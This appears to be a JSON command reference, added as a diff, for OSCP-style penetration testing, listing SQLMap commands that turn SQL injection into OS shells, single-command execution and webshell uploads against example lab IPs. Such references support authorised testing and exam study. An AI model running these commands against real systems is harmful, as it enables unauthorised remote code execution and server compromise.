@@ -1,0 +1,195 @@
+{
+  "category": "web",
+  "subcategory": "sql-injection",
+  "description": "SQLMap commands for OS command execution and RCE through SQL injection",
+  "commands": [
+    {
+      "id": "sqlmap-fingerprint",
+      "name": "SQLMap Database Fingerprint",
+      "category": "web",
+      "command": "sqlmap -u '<URL>' --batch --banner --fingerprint",
+      "description": "Identify database type, version, and fingerprint for targeted exploitation",
+      "tags": ["SQLMAP", "SQL_INJECTION", "ENUMERATION", "DATABASE", "OSCP:HIGH"],
+      "variables": [
+        {"name": "<URL>", "description": "Target URL with vulnerable parameter", "example": "http://192.168.45.100/page.php?id=1", "required": true}
+      ],
+      "flag_explanations": {
+        "--banner": "Retrieve database management system banner (version info)",
+        "--fingerprint": "Perform extensive database fingerprinting to identify exact DBMS type and version"
+      },
+      "success_indicators": ["back-end DBMS:", "banner:", "web application technology:"],
+      "failure_indicators": ["connection timed out", "parameter does not appear to be injectable"],
+      "notes": "First step before attempting OS shell. Identifies MSSQL (xp_cmdshell), MySQL (INTO OUTFILE), PostgreSQL (COPY). Version determines available exploits.",
+      "oscp_relevance": "high",
+      "filled_example": "sqlmap -u 'http://192.168.45.100/page.php?id=1' --batch --banner --fingerprint"
+    },
+    {
+      "id": "sqlmap-is-dba",
+      "name": "SQLMap Check DBA Privileges",
+      "category": "web",
+      "command": "sqlmap -u '<URL>' -p <PARAMETER> --is-dba --batch",
+      "description": "Check if current database user has DBA (sysadmin) privileges required for OS shell",
+      "tags": ["SQLMAP", "SQL_INJECTION", "PRIVILEGE_CHECK", "DATABASE", "OSCP:HIGH"],
+      "variables": [
+        {"name": "<URL>", "description": "Target URL with vulnerable parameter", "example": "http://192.168.45.100/page.php?id=1", "required": true},
+        {"name": "<PARAMETER>", "description": "Vulnerable parameter name", "example": "id", "required": true}
+      ],
+      "flag_explanations": {
+        "-p": "Specify parameter to test",
+        "--is-dba": "Check if database user is DBA/sysadmin - required for xp_cmdshell and file operations"
+      },
+      "success_indicators": ["current user is DBA: True"],
+      "failure_indicators": ["current user is DBA: False"],
+      "notes": "DBA required for: MSSQL xp_cmdshell, MySQL FILE privilege operations, PostgreSQL COPY. If not DBA, try --priv-esc or look for other attack vectors.",
+      "oscp_relevance": "high",
+      "filled_example": "sqlmap -u 'http://192.168.45.100/page.php?id=1' -p id --is-dba --batch"
+    },
+    {
+      "id": "sqlmap-privileges",
+      "name": "SQLMap Enumerate User Privileges",
+      "category": "web",
+      "command": "sqlmap -u '<URL>' -p <PARAMETER> --privileges --batch",
+      "description": "Enumerate database user privileges to determine available attack paths",
+      "tags": ["SQLMAP", "SQL_INJECTION", "ENUMERATION", "PRIVILEGES", "OSCP:MEDIUM"],
+      "variables": [
+        {"name": "<URL>", "description": "Target URL with vulnerable parameter", "example": "http://192.168.45.100/page.php?id=1", "required": true},
+        {"name": "<PARAMETER>", "description": "Vulnerable parameter name", "example": "id", "required": true}
+      ],
+      "flag_explanations": {
+        "--privileges": "Enumerate DBMS user privileges - shows FILE, SUPER, PROCESS, etc."
+      },
+      "success_indicators": ["database management system users privileges:", "FILE", "SUPER"],
+      "failure_indicators": ["unable to retrieve the privileges"],
+      "notes": "Look for: FILE (MySQL webshell), SUPER (MySQL UDF), PROCESS (info leak). MSSQL shows sysadmin/serveradmin roles.",
+      "oscp_relevance": "medium",
+      "filled_example": "sqlmap -u 'http://192.168.45.100/page.php?id=1' -p id --privileges --batch"
+    },
+    {
+      "id": "sqlmap-os-shell",
+      "name": "SQLMap OS Shell",
+      "category": "web",
+      "command": "sqlmap -u '<URL>' -p <PARAMETER> --os-shell --batch",
+      "description": "Attempt to spawn interactive OS shell through SQL injection (auto-selects technique based on DBMS)",
+      "tags": ["SQLMAP", "SQL_INJECTION", "RCE", "SHELL", "OSCP:HIGH"],
+      "variables": [
+        {"name": "<URL>", "description": "Target URL with vulnerable parameter", "example": "http://192.168.45.100/page.php?id=1", "required": true},
+        {"name": "<PARAMETER>", "description": "Vulnerable parameter name", "example": "id", "required": true}
+      ],
+      "flag_explanations": {
+        "--os-shell": "Spawn interactive OS shell - uses xp_cmdshell (MSSQL), INTO OUTFILE (MySQL), COPY (PostgreSQL)"
+      },
+      "success_indicators": ["os-shell>", "command shell prompt"],
+      "failure_indicators": ["unable to prompt for an interactive operating system shell", "DBA privileges required"],
+      "notes": "Fastest path from SQLi to shell. Requires DBA privileges. Auto-handles xp_cmdshell enable/disable for MSSQL. May prompt for web root path for webshell techniques.",
+      "oscp_relevance": "high",
+      "filled_example": "sqlmap -u 'http://192.168.45.100/page.php?id=1' -p id --os-shell --batch"
+    },
+    {
+      "id": "sqlmap-os-shell-mssql",
+      "name": "SQLMap OS Shell MSSQL",
+      "category": "web",
+      "command": "sqlmap -u '<URL>' -p <PARAMETER> --os-shell --dbms=mssql --batch",
+      "description": "Force MSSQL-specific OS shell using xp_cmdshell extended stored procedure",
+      "tags": ["SQLMAP", "SQL_INJECTION", "RCE", "MSSQL", "XP_CMDSHELL", "OSCP:HIGH"],
+      "variables": [
+        {"name": "<URL>", "description": "Target URL with vulnerable parameter", "example": "http://192.168.45.100/page.aspx?id=1", "required": true},
+        {"name": "<PARAMETER>", "description": "Vulnerable parameter name", "example": "id", "required": true}
+      ],
+      "flag_explanations": {
+        "--os-shell": "Spawn OS shell",
+        "--dbms=mssql": "Force Microsoft SQL Server techniques - ensures xp_cmdshell is used"
+      },
+      "success_indicators": ["os-shell>", "xp_cmdshell procedure"],
+      "failure_indicators": ["xp_cmdshell is disabled", "sa account required"],
+      "notes": "MSSQL uses xp_cmdshell for command execution. sqlmap auto-enables if disabled (requires sysadmin). Commands run as SQL Server service account (often high privilege).",
+      "oscp_relevance": "high",
+      "filled_example": "sqlmap -u 'http://192.168.45.100/page.aspx?id=1' -p id --os-shell --dbms=mssql --batch"
+    },
+    {
+      "id": "sqlmap-os-shell-mysql",
+      "name": "SQLMap OS Shell MySQL",
+      "category": "web",
+      "command": "sqlmap -u '<URL>' -p <PARAMETER> --os-shell --dbms=mysql --batch",
+      "description": "Force MySQL-specific OS shell using INTO OUTFILE webshell or UDF injection",
+      "tags": ["SQLMAP", "SQL_INJECTION", "RCE", "MYSQL", "WEBSHELL", "OSCP:HIGH"],
+      "variables": [
+        {"name": "<URL>", "description": "Target URL with vulnerable parameter", "example": "http://192.168.45.100/page.php?id=1", "required": true},
+        {"name": "<PARAMETER>", "description": "Vulnerable parameter name", "example": "id", "required": true}
+      ],
+      "flag_explanations": {
+        "--os-shell": "Spawn OS shell",
+        "--dbms=mysql": "Force MySQL techniques - uses INTO OUTFILE webshell or UDF injection"
+      },
+      "success_indicators": ["os-shell>", "file stager uploaded"],
+      "failure_indicators": ["secure_file_priv", "web application absolute path"],
+      "notes": "MySQL requires FILE privilege and @@secure_file_priv empty/accessible. sqlmap prompts for web root path. Creates PHP webshell for command execution.",
+      "oscp_relevance": "high",
+      "filled_example": "sqlmap -u 'http://192.168.45.100/page.php?id=1' -p id --os-shell --dbms=mysql --batch"
+    },
+    {
+      "id": "sqlmap-os-shell-postgresql",
+      "name": "SQLMap OS Shell PostgreSQL",
+      "category": "web",
+      "command": "sqlmap -u '<URL>' -p <PARAMETER> --os-shell --dbms=postgresql --batch",
+      "description": "Force PostgreSQL-specific OS shell using COPY or large object functions",
+      "tags": ["SQLMAP", "SQL_INJECTION", "RCE", "POSTGRESQL", "OSCP:HIGH"],
+      "variables": [
+        {"name": "<URL>", "description": "Target URL with vulnerable parameter", "example": "http://192.168.45.100/page.py?id=1", "required": true},
+        {"name": "<PARAMETER>", "description": "Vulnerable parameter name", "example": "id", "required": true}
+      ],
+      "flag_explanations": {
+        "--os-shell": "Spawn OS shell",
+        "--dbms=postgresql": "Force PostgreSQL techniques - uses COPY TO or lo_export for file write"
+      },
+      "success_indicators": ["os-shell>", "COPY command"],
+      "failure_indicators": ["superuser required", "COPY failed"],
+      "notes": "PostgreSQL requires superuser role. Uses COPY TO PROGRAM (9.3+) for direct command execution or large object export for webshell.",
+      "oscp_relevance": "high",
+      "filled_example": "sqlmap -u 'http://192.168.45.100/page.py?id=1' -p id --os-shell --dbms=postgresql --batch"
+    },
+    {
+      "id": "sqlmap-os-cmd",
+      "name": "SQLMap Single OS Command",
+      "category": "web",
+      "command": "sqlmap -u '<URL>' -p <PARAMETER> --os-cmd='<COMMAND>' --batch",
+      "description": "Execute single OS command through SQL injection without interactive shell",
+      "tags": ["SQLMAP", "SQL_INJECTION", "RCE", "COMMAND_EXECUTION", "OSCP:HIGH"],
+      "variables": [
+        {"name": "<URL>", "description": "Target URL with vulnerable parameter", "example": "http://192.168.45.100/page.php?id=1", "required": true},
+        {"name": "<PARAMETER>", "description": "Vulnerable parameter name", "example": "id", "required": true},
+        {"name": "<COMMAND>", "description": "OS command to execute", "example": "whoami", "required": true}
+      ],
+      "flag_explanations": {
+        "--os-cmd": "Execute single command and return output - faster than --os-shell for quick checks"
+      },
+      "success_indicators": ["command output returned"],
+      "failure_indicators": ["unable to execute command"],
+      "notes": "Use for quick command execution without interactive shell overhead. Good for verifying RCE before establishing reverse shell.",
+      "oscp_relevance": "high",
+      "filled_example": "sqlmap -u 'http://192.168.45.100/page.php?id=1' -p id --os-cmd='whoami' --batch"
+    },
+    {
+      "id": "sqlmap-file-write",
+      "name": "SQLMap Write File",
+      "category": "web",
+      "command": "sqlmap -u '<URL>' -p <PARAMETER> --file-write='<LOCAL_FILE>' --file-dest='<REMOTE_PATH>' --batch",
+      "description": "Upload local file to target server through SQL injection (webshell, tools, etc.)",
+      "tags": ["SQLMAP", "SQL_INJECTION", "FILE_UPLOAD", "WEBSHELL", "OSCP:HIGH"],
+      "variables": [
+        {"name": "<URL>", "description": "Target URL with vulnerable parameter", "example": "http://192.168.45.100/page.php?id=1", "required": true},
+        {"name": "<PARAMETER>", "description": "Vulnerable parameter name", "example": "id", "required": true},
+        {"name": "<LOCAL_FILE>", "description": "Local file to upload", "example": "./shell.php", "required": true},
+        {"name": "<REMOTE_PATH>", "description": "Destination path on target", "example": "/var/www/html/shell.php", "required": true}
+      ],
+      "flag_explanations": {
+        "--file-write": "Local file to upload to target",
+        "--file-dest": "Absolute path on target where file will be written"
+      },
+      "success_indicators": ["file written to", "file uploaded"],
+      "failure_indicators": ["unable to write file", "permission denied"],
+      "notes": "Requires FILE privilege (MySQL) or appropriate write permissions. Use for uploading custom webshells when --os-shell fails. Must know exact web root path.",
+      "oscp_relevance": "high",
+      "filled_example": "sqlmap -u 'http://192.168.45.100/page.php?id=1' -p id --file-write='./shell.php' --file-dest='/var/www/html/shell.php' --batch"
+    }
+  ]
+}
